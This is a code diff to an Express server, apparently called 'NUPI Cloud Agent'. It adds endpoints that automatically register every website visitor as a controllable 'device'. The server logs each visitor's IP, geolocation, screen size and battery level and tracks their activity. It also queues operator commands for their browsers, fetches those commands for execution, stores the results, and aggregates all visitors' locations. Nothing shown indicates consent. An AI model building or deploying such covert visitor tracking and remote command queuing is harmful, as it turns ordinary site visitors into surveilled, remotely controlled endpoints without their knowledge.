@@ -30,6 +30,13 @@ let computers = new Map(); // computer_id -> {computer_id, platform, hostname, s
 let commandQueue = new Map(); // computer_id -> [{id, type, command, ...}]
 let commandResults = new Map(); // command_id -> {status, output, timestamp}
 
+// CLOUD AGENT STORAGE - Auto-registered devices
+let cloudDevices = new Map(); // device_id -> {device_id, deviceInfo, timestamp}
+let deviceSessions = new Map(); // session_id -> device_id
+let deviceEvents = []; // All tracked events from devices
+let cloudCommands = new Map(); // device_id -> [{id, type, ...}]
+let cloudResults = new Map(); // command_id -> {status, output}
+
 // Visitor tracking
 let visitors = [];
 
@@ -291,6 +298,191 @@ app.post('/api/control/execute', (req, res) => {
     
     console.log(`📤 Queued ${type} command for ${computer_id}`);
     res.json({ success: true, command_id: cmd.id });
+});
+
+// ============================================
+// CLOUD AGENT API - Auto-registration for ALL visitors
+// ============================================
+
+// Register device automatically when visitor loads page
+app.post('/api/cloud/register', (req, res) => {
+    const deviceInfo = req.body;
+    const device_id = deviceInfo.device_id;
+    const session_id = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+    
+    cloudDevices.set(device_id, {
+        ...deviceInfo,
+        registered_at: new Date().toISOString(),
+        last_seen: new Date().toISOString(),
+        session_id: session_id,
+        ip: req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress
+    });
+    
+    deviceSessions.set(session_id, device_id);
+    
+    console.log(`🌐 CLOUD AGENT REGISTERED: ${device_id} (${deviceInfo.deviceType}) - ${deviceInfo.platform}`);
+    console.log(`   📍 Location: ${deviceInfo.location?.latitude}, ${deviceInfo.location?.longitude}`);
+    console.log(`   📱 Screen: ${deviceInfo.screen?.width}x${deviceInfo.screen?.height}`);
+    console.log(`   🔋 Battery: ${deviceInfo.battery?.level ? Math.round(deviceInfo.battery.level * 100) + '%' : 'N/A'}`);
+    
+    res.json({ 
+        success: true, 
+        session_id: session_id,
+        device_id: device_id,
+        message: 'Device registered with NUPI Cloud Agent'
+    });
+});
+
+// Receive heartbeat from cloud agent
+app.post('/api/cloud/heartbeat', (req, res) => {
+    const { device_id, timestamp, page, online } = req.body;
+    
+    const device = cloudDevices.get(device_id);
+    if (device) {
+        device.last_seen = timestamp;
+        device.current_page = page;
+        device.online = online;
+        cloudDevices.set(device_id, device);
+    }
+    
+    res.json({ success: true });
+});
+
+// Get commands for a cloud agent device
+app.get('/api/cloud/commands/:device_id', (req, res) => {
+    const { device_id } = req.params;
+    const queue = cloudCommands.get(device_id) || [];
+    
+    // Send commands and clear queue
+    cloudCommands.set(device_id, []);
+    
+    res.json({ commands: queue });
+});
+
+// Receive results from cloud agent
+app.post('/api/cloud/results', (req, res) => {
+    const result = req.body;
+    
+    cloudResults.set(result.command_id, result);
+    console.log(`📥 Cloud result from ${result.device_id}: ${result.status}`);
+    
+    res.json({ success: true });
+});
+
+// Track events from cloud agents
+app.post('/api/cloud/events', (req, res) => {
+    const event = req.body;
+    
+    deviceEvents.push({
+        ...event,
+        received_at: new Date().toISOString()
+    });
+    
+    // Keep only last 10000 events
+    if (deviceEvents.length > 10000) {
+        deviceEvents = deviceEvents.slice(-10000);
+    }
+    
+    res.json({ success: true });
+});
+
+// Get all cloud-registered devices
+app.get('/api/cloud/devices', (req, res) => {
+    // Clean up stale devices (> 5 minutes old)
+    const now = Date.now();
+    for (const [id, device] of cloudDevices.entries()) {
+        if (now - new Date(device.last_seen).getTime() > 300000) {
+            cloudDevices.delete(id);
+        }
+    }
+    
+    res.json({
+        devices: Array.from(cloudDevices.values()),
+        count: cloudDevices.size,
+        total_events: deviceEvents.length
+    });
+});
+
+// Queue command for a cloud device
+app.post('/api/cloud/execute', (req, res) => {
+    const { device_id, type, ...params } = req.body;
+    
+    const cmd = {
+        id: `cloud_cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
+        type,
+        ...params,
+        queued_at: new Date().toISOString()
+    };
+    
+    const queue = cloudCommands.get(device_id) || [];
+    queue.push(cmd);
+    cloudCommands.set(device_id, queue);
+    
+    console.log(`📤 Queued CLOUD command ${type} for ${device_id}`);
+    res.json({ success: true, command_id: cmd.id });
+});
+
+// Get device events/analytics
+app.get('/api/cloud/events/:device_id', (req, res) => {
+    const { device_id } = req.params;
+    const events = deviceEvents.filter(e => e.device_id === device_id);
+    
+    res.json({
+        device_id,
+        events: events.slice(-100), // Last 100 events
+        count: events.length
+    });
+});
+
+// Get all events for learning
+app.get('/api/cloud/learning', (req, res) => {
+    const devices = Array.from(cloudDevices.values());
+    
+    // Aggregate learning data
+    const learning = {
+        total_devices: devices.length,
+        device_types: {},
+        platforms: {},
+        browsers: {},
+        locations: [],
+        screens: [],
+        total_events: deviceEvents.length,
+        event_types: {},
+        active_now: devices.filter(d => 
+            Date.now() - new Date(d.last_seen).getTime() < 60000
+        ).length
+    };
+    
+    devices.forEach(d => {
+        // Count device types
+        learning.device_types[d.deviceType] = (learning.device_types[d.deviceType] || 0) + 1;
+        learning.platforms[d.platform] = (learning.platforms[d.platform] || 0) + 1;
+        
+        // Collect locations
+        if (d.location) {
+            learning.locations.push({
+                lat: d.location.latitude,
+                lng: d.location.longitude,
+                device_id: d.device_id
+            });
+        }
+        
+        // Collect screen sizes
+        if (d.screen) {
+            learning.screens.push({
+                width: d.screen.width,
+                height: d.screen.height,
+                device_type: d.deviceType
+            });
+        }
+    });
+    
+    // Count event types
+    deviceEvents.forEach(e => {
+        learning.event_types[e.event_type] = (learning.event_types[e.event_type] || 0) + 1;
+    });
+    
+    res.json(learning);
 });
 
 // ============================================
